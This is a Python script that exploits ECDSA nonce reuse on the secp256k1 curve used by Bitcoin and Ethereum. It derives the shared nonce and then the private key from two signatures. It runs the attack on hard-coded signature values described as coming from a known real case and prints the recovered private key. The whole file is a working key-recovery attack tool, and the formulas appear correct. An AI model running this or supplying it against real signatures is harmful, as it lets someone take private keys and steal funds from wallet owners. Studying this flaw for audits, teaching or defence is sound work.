import sys

def recover_key(r, s1, z1, s2, z2):
    """
    Recovers the private key (d) from two ECDSA signatures sharing a nonce.
    Uses Secp256k1 curve parameters (standard for Bitcoin/Ethereum).
    """
    
    # Secp256k1 Curve Order (n)
    # This is a fixed constant for this specific curve.
    n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

    print(f"[*] Shared r: {hex(r)}")
    print(f"[*] Analyzing signatures...")

    try:
        # 1. Calculate the shared nonce (k)
        # Formula: k = (z1 - z2) / (s1 - s2) mod n
        # In modular arithmetic, division is multiplying by the modular inverse.
        
        delta_z = (z1 - z2) % n
        delta_s = (s1 - s2) % n
        
        # pow(a, -1, n) calculates the modular multiplicative inverse of a modulo n
        # This is available in Python 3.8+
        k = (delta_z * pow(delta_s, -1, n)) % n
        
        # 2. Calculate the Private Key (d)
        # Formula: d = ((s1 * k) - z1) / r mod n
        
        s1_k = (s1 * k) % n
        numerator = (s1_k - z1) % n
        d = (numerator * pow(r, -1, n)) % n
        
        return d

    except ValueError:
        print("[!] Error: Modular inverse does not exist. Check your inputs.")
        return None

# --- EXPLAINER ---
# r  = The 'r' value (must be the same in both signatures)
# s1 = The 's' value from the first signature
# z1 = The hash of the first message (converted to integer)
# s2 = The 's' value from the second signature
# z2 = The hash of the second message (converted to integer)

if __name__ == "__main__":
    # Example vulnerable data (from a known nonce-reuse case)
    r_val  = 0xeabcb0e351e3a965b2dde95a1a1ecbffea59aed1c7cbfbfb58b4fac615053fad
    
    s1_val = 0xa365e81aac581bd1240697a6e60f833f2b72b4257ad469b69f1af924169ce3cd
    z1_val = 0xb95bed90a79c4d2544e66b3b0b63d5412b198ebc361619caa7b984546e2c6c5f
    
    s2_val = 0x25003c52b2e583eff4b101af2f48352218cfc535600364ca0b860c6eb3b7a73a
    z2_val = 0x6383a22d1870fc6072186dac4bc287d8ba6925bece94e49523624aa8d6592df9

    private_key = recover_key(r_val, s1_val, z1_val, s2_val, z2_val)

    if private_key:
        print("-" * 40)
        print(f"PRIVATE KEY FOUND:")
        print(f"HEX: {hex(private_key)}")
        print(f"DEC: {private_key}")
        print("-" * 40)